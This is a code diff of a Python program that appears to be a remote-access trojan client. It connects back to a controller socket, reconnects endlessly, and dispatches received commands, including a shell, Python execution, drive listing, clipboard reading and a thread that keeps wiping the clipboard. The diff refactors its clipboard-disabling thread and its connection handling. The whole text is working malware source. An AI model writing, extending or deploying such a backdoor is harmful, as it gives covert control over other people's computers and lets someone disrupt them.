@@ -14,9 +14,12 @@ BUFF_SIZE = 64
 ADDRESS = socket.gethostbyname(socket.gethostname())
 PORT = 5050
 FORMAT = "utf-8"
-SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+SERVER = None
+CLIPBOARD_THREAD_ACTIVE = False
 
 def main():
+    global CLIPBOARD_THREAD_ACTIVE
+    global disable_clipboard_thread
     while True:
         # Connect to server
         connect_to_server()
@@ -40,10 +43,13 @@ def main():
 
                 elif command == "disableclipboard":
                     if not disable_clipboard_thread.is_alive():
+                        CLIPBOARD_THREAD_ACTIVE = True
                         disable_clipboard_thread.start()
 
                 elif command == "activateclipbaord":
-                    disable_clipboard_thread.daemon = False
+                    CLIPBOARD_THREAD_ACTIVE = False
+                    send("Clipboard activated")
+                    disable_clipboard_thread = threading.Thread(target=disable_clipboard)
 
                 elif command == "python":
                     python()
@@ -75,8 +81,10 @@ def main():
                 elif command == "drives":
                     drives()
 
-            except socket.error as e:
-                del SERVER
+                else:
+                    send("Command unknown")
+
+            except socket.error:
                 break
 
 # Runs command shell
@@ -95,10 +103,11 @@ def clipboard():
 
 # Constantly deletes clipboard
 def disable_clipboard():
-    while disable_clipboard_thread.daemon:
+    send("Disabling Clipboard...")
+    while CLIPBOARD_THREAD_ACTIVE:
         win32clipboard.OpenClipboard()
         try:
-            while disable_clipboard_thread.daemon:
+            while CLIPBOARD_THREAD_ACTIVE:
                 win32clipboard.EmptyClipboard()
                 sleep(1)
         finally:
@@ -210,6 +219,8 @@ def drives():
 
 
 def connect_to_server():
+    global SERVER
+    SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
         try:
             SERVER.connect((ADDRESS, PORT))
@@ -235,11 +246,15 @@ def send(msg):
     sleep(0.1)
     SERVER.send(msg.encode())
 
+def create_clipboard_thread():
+    pass
+
+disable_clipboard_thread = threading.Thread(target=disable_clipboard)
+disable_clipboard_thread.daemon = True
+
 if __name__ == '__main__':
     while True:
         main()
         del SERVER
 
 
-disable_clipboard_thread = threading.Thread(target=disable_clipboard)
-disable_clipboard_thread.daemon = True
